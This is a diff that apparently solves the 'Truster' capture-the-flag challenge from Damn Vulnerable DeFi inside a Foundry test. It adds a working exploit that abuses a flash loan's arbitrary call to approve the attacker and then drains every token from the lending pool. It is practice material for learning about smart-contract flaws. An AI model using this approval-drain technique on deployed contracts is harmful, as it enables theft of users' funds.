@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -41,6 +42,13 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        trusterLenderPool.flashLoan(
+            TOKENS_IN_POOL,
+            address(trusterLenderPool),
+            address(dvt),
+            abi.encodeCall(IERC20.approve, (address(this), TOKENS_IN_POOL))
+        );
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
 
         /**
          * EXPLOIT END *
